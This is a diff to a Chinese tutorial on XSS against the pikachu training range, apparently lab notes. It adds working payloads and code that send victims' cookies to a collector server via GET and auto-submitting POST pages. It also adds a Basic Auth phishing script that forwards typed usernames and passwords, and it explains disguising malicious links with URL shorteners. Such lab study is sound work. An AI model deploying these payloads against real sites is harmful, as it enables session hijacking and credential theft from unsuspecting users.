@@ -344,7 +344,7 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
 
 尝试使用大写绕过和双写绕过，无效。尝试其他标签绕过，成功！
 
-> 》利用
+> 利用
 
 payload：`<img src="1" onerror="alert(document.cookie)" style="display:none">`
 
@@ -634,3 +634,133 @@ payload: `javascript:alert(document.cookie)`
 
 payload: `tmac'; document.location='http://www.baidu.com`
 
+### XSS 实战
+
+pikachu 靶场的作者为我们提供了一套 XSS 利用代码，利用代码存放在 `/app/pkxss/` 路径（我用的是 Docker，其他方式部署的靶场路径应该也大同小异）下，要想启用这些功能，首先要打开靶场的 `管理工具\XSS后台` ，初始化数据库。
+
+```shell
+root@3843698b8a83:/app/pkxss/xcookie# ll
+total 20
+drwxr-xr-x 2 www-data staff 4096 Apr 25 15:33 ./
+drwxr-xr-x 6 www-data staff 4096 Apr 25 14:56 ../
+-rw-r--r-- 1 www-data staff  622 Jan  5  2020 cookie.php
+-rw-r--r-- 1 www-data staff 1557 Jan  5  2020 pkxss_cookie_result.php
+-rw-r--r-- 1 www-data staff  802 Apr 25 15:33 post.html
+```
+
+***
+#### Get 获取 Cookie
+
+>分析
+
+从 `cookie.php` 开始看起，这段代码的意思就是将 Get 请求参数中的 cookie 参数值加上其他的一些状态保存到数据库里，然后重定向到某个网站。
+
+```php
+<?php
+include_once '../inc/config.inc.php';
+include_once '../inc/mysql.inc.php';
+$link=connect();
+
+//这个是获取cookie的api页面
+
+if(isset($_GET['cookie'])){
+    $time=date('Y-m-d g:i:s');
+    $ipaddress=getenv ('REMOTE_ADDR');
+    $cookie=$_GET['cookie'];
+    $referer=$_SERVER['HTTP_REFERER'];
+    $useragent=$_SERVER['HTTP_USER_AGENT'];
+    $query="insert cookies(time,ipaddress,cookie,referer,useragent)
+    values('$time','$ipaddress','$cookie','$referer','$useragent')";
+    $result=mysqli_query($link, $query);
+}
+header("Location:http://192.168.1.4/pikachu/index.php");//重定向到一个可信的网站
+?>
+```
+
+持久化的步骤没什么需要改的，我们将重定向的地址修改一下即可，这里我将地址修改为靶场的首页。eg：http://192.168.127.200:9000/index.php，也可以直接将其重定向到 referer 页面，这样客户端不会出现无缘无故跳转的情况。
+
+利用方式：docuemnt.location 能够将浏览器重定向到其他页面，我们只要将 document.location 指向 cookie.php，就能获取用户的 cookie 了。
+
+>利用
+
+payload:`<script>document.location="http://192.168.127.200:9000/pkxss/xcookie/cookie.php?cookie="+document.cookie</script>`
+
+将 payload 注入到靶场注入点中，以反射型xss(get) 为例，将 payload 输入并提交，页面跳转，后台成功获取用户的 cookie
+
+![](../../image/Pasted%20image%2020230426024340.png)
+
+在正式场景中，黑客往往会将漏洞利用的 url 提取出来，诱导用户点击，以达到攻击的目的，上述漏洞的 url 为 `http://192.168.127.200:9000/vul/xss/xss_reflected_get.php?message=<script>document.location="http://192.168.127.200:9000/pkxss/xcookie/cookie.php?cookie="+document.cookie</script>&submit=submit`
+
+一般情况下，黑客使用的都是经过缩短的短链接，因为过长的 url 可能会引起用户的戒心。
+
+***
+#### Post 获取 Cookie
+
+> 分析
+
+post.html 里面存放了使用 post 方法获取用户 cookie 的代码，第一个地址要修改为漏洞服务器上的地址，url 指向注入点，第二个地址是用来传递 cookie 的，因此要修改为我们用来接收 cookie 的服务器的地址。
+
+```html
+<html>
+<head>
+<script>
+	// 页面一打开就提交表单，跳转页面
+	window.onload = function() {
+	  document.getElementById("postsubmit").click();
+	}
+</script>
+</head>
+<body>
+	<form method="post" action="http://192.168.127.200:9000/vul/xss/xsspost/xss_reflected_post.php">
+    
+    <input id="xssr_in" type="text" name="message" value="<script>document.location = 'http://192.168.127.200:9000/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>"/>
+    <input id="postsubmit" type="submit" name="submit" value="submit" />
+</form>
+</body>
+</html>
+```
+
+这个漏洞利用代码是为 反射性xss(post) 量身定做的，让我们看一下打开 post.html 之后，他会做什么
+
+![](../../image/Pasted%20image%2020230426030223.png)
+
+1. 页面一打开就会以 post 方法提交表单
+2. 如果用户没有登录，那么这个请求会因为权限问题被拒绝访问，跳转回登录页面
+	1. 所以这份代码对于未登录的用户是无效的
+3. post 请求的参数 message 的值是一段 js 代码，这段代码的作用是将页面重定向到上文的 cookie.php，并将 cookie 传递过去
+
+> 利用
+
+1. 以 admin/123456 身份登录
+2. 打开 http://192.168.127.200:9000/pkxss/xcookie/post.html
+3. 打开黑客服务器后端，成功获取到了admin 的cookie
+
+![](../../image/Pasted%20image%2020230426031728.png)
+
+***
+#### 钓鱼攻击
+
+>分析
+
+钓鱼攻击的利用代码存放路径为 `/app/pkxss/xfish/fish.php`，需要将跳转的地址修改为黑客服务器的地址
+
+```php
+<?php
+	error_reporting(0);
+	// var_dump($_SERVER);
+	if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
+	//发送认证框，并给出迷惑性的info
+	    header('Content-type:text/html;charset=utf-8');
+	    header("WWW-Authenticate: Basic realm='认证'");
+	    header('HTTP/1.0 401 Unauthorized');
+	    echo 'Authorization Required.';
+	    exit;
+	} else if ((isset($_SERVER['PHP_AUTH_USER'])) &&(isset($_SERVER['PHP_AUTH_PW']))){
+		//将结果发送给搜集信息的后台,请将这里的IP地址修改为管理后台的IP
+	    header("Location: http://192.168.1.15/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}
+	    &password={$_SERVER[PHP_AUTH_PW]}");
+	}
+?>
+```
+
+<script src="http://192.168.127.200:9000/pkxss/xfish/fish.php"></script>
